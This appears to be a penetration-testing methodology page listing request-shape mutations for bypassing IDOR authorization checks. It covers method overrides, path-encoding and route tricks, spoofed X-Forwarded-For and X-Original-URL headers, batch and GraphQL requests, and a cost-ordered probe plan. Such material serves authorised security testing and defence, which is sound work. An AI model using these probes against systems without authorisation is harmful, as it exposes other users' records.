# Bypass shapes — the check exists but a different request shape reaches past it

The IDOR check usually works on the request shape it was written for.
These are the shape-mutations that route around it. Each is a single
falsifiable probe: same object id, different shape.

---

## 1. Method switching

The middleware guards `GET`; the handler answers anything.

```
GET     /users/1            → 403
POST    /users/1            → ?
PUT     /users/1            → ?
PATCH   /users/1            → ?
DELETE  /users/1            → ?
OPTIONS /users/1            → ?
HEAD    /users/1            → ?   (status+length only, but free)
TRACE / CONNECT / PROPFIND  → exotic, occasionally routed
POST /users/1 + X-HTTP-Method-Override: GET
POST /users/1 + X-Method-Override: GET
POST /users/1?_method=GET   → Rails/Express override param
POST /users/1 + method=delete → framework-specific
```

A 200 on any verb the check wasn't written for is the bypass. HEAD is
the cheapest existence oracle — no body but status and
`Content-Length` still differ between own/foreign/nonexistent.

## 2. Content-Type switching

The check parses the body one way; the handler accepts several.

```
Content-Type: application/json    {"id":1}
Content-Type: application/x-www-form-urlencoded   id=1
Content-Type: multipart/form-data (boundary part named id)
Content-Type: text/plain          {"id":1}
Content-Type: application/json;charset=utf-16     (encoded body)
Content-Type: application/vnd.api+json  (JSON:API shape {"data":{"id":...}})
Content-Type: application/graphql   {user(id:1){email}}
```

Real pattern: the auth middleware inspects `request.json` — a
`text/plain` body carrying JSON bypasses the middleware's parser while
the handler's tolerant parser still reads it. Or the reverse: the
check reads form fields, the handler binds JSON.

## 3. Route and path mutations

```
/users/1        /users/1/         /users//1        //users/1
/users/./1      /users/%31        /users/%2e%2e/1
/users/1.json   /users/1.xml      /users/1.html    /users/1.txt
/users/1;foo=bar      /users/1?    /users/1#
/Users/1        /USERS/1          /users%2f1       /users%252f1
/api/users/1    /api/v1/users/1   /api/v2/users/1  /v1/users/1
/internal/users/1   /public/users/1   /admin/users/1
/users?id=1     /users/1?         /users//%2f/1
```

Each targets a different matching rule: case-insensitive routers,
double-slash normalizers, extension-stripping handlers, versioned
mounts with separate middleware. A proxy normalizing `%2f` differently
than the app is the parser-differential class (see
`skills/web-parser-differential/`).

## 4. Parameter-name mutations

```
id=1   user_id=1   userId=1   user-id=1   uid=1   u=1
_id=1  ID=1   Id=1   iD=1   obj_id=1   object_id=1   record_id=1
user.id=1   user[id]=1   user_id[]=1   "user_id":1   'user_id':1
```

The check reads `req.query.id`; the ORM binds `user_id`. Or the check
matches `/^id$/` exactly and ` ID ` / `id ` / `%09id` survives.

## 5. Protocol mutations

- **HTTP/1.0 vs 1.1 vs h2**: some middleware only hooks h1 request
  lines; h2 requests skip them (rare but real in mixed stacks).
- **Trailing data**: `GET /users/1 HTTP/1.1` with a pipelined second
  request — the check runs on the first, the second rides through
  (adjacent to request-smuggling).
- **Fragment**: `#/users/1` client-side routing — the id never reaches
  the server; but the SPA's own API call may carry it differently.

## 6. Auth-context mutations

```
Cookie: session=<B>          → baseline
Cookie: session=<B>; X-User-Id: 1      → header supplement
Authorization: Bearer <B-token>        → cookie vs bearer paths differ
(no auth)                              → anonymous route
Cookie: session=<expired>              → degraded-auth path
X-Api-Key: <B's key>                   → api-key path vs session path
```

Two authn paths (cookie session vs bearer token vs api key) frequently
run different authorization — the API-key path was built for
integrations and skips the per-owner scope. If the app hands out API
keys at all, that path gets its own probe row.

## 7. Request-context mutations

```
Referer: /users/me          Origin: https://app.example
X-Forwarded-For: 127.0.0.1  X-Real-IP: 127.0.0.1
X-Original-URL: /users/1    X-Rewrite-URL: /users/1
X-Forwarded-Host: internal  X-Forwarded-Proto: https
```

`X-Original-URL`/`X-Rewrite-URL` are the high-value pair: front-end
frameworks and some proxies honour them, so `GET / X-Original-URL:
/users/1` may reach the handler by a route the middleware never saw.

## 8. Batch and composite shapes

```
POST /api/batch        [{"method":"GET","url":"/users/1"}]
POST /graphql          [{"query":"{u:user(id:1){email}}"}]   # array batch
GET  /users/1,2,3      # comma-list in path
GET  /users?ids[]=1&ids[]=42
{"queries":[...]}      # GraphQL multi-op
```

Batch endpoints run per-element checks at worst, none at best — a
batch that includes one own id and one foreign id tells you which:
200 for the pair means per-element checks are missing.

## 9. Response-shape negotiation

```
Accept: application/json     Accept: text/html
Accept: application/xml      Accept: application/pdf
?format=xml   ?format=json   ?output=raw   ?view=internal
```

The check may live in the JSON serializer's scope while the XML/PDF
renderer fetches raw — or the export format pulls a wider field set
(the `internal` view including `role`, `password_hash`, `flag`).

## 10. Ordering the bypass matrix

Cost-ordered probe plan against a foreign id that denied on the
baseline shape:

1. HEAD + OPTIONS (free, existence oracle)
2. method switch: POST, PATCH (2 probes)
3. path mutations: trailing slash, `.json`, case flip, `?` suffix (4)
4. content-type: form body carrying the id (1)
5. route mutations: `/api/` prefix, `/v2/`, `X-Original-URL` (3)
6. batch: mixed own+foreign array (1)

~12 probes cover the realistic bypass surface. All denied → the check
is at the model layer; record the negatives and switch to
ownership-model attacks (`mass-assignment.md`,
`second-order-idor.md`, `lifecycle-idor.md`).
